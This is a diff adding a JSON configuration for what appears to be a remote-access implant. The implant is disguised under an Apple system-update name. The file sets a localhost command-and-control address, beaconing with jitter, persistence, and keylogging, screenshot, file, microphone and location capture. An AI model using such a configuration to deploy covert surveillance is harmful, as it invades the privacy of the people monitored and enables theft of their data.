@@ -1,0 +1,19 @@
+{
+  "uuid": "27cfb325-0b53-4515-a5e3-4196bd113b05",
+  "name": "com.apple.system.update",
+  "c2": {
+    "host": "127.0.0.1",
+    "port": 4520
+  },
+  "beacon_interval": 60,
+  "jitter": 0.2,
+  "persistence": true,
+  "features": [
+    "keylog",
+    "screenshot",
+    "files",
+    "mic",
+    "location"
+  ],
+  "created": "2026-10-19T13:25:54.407512Z"
+}
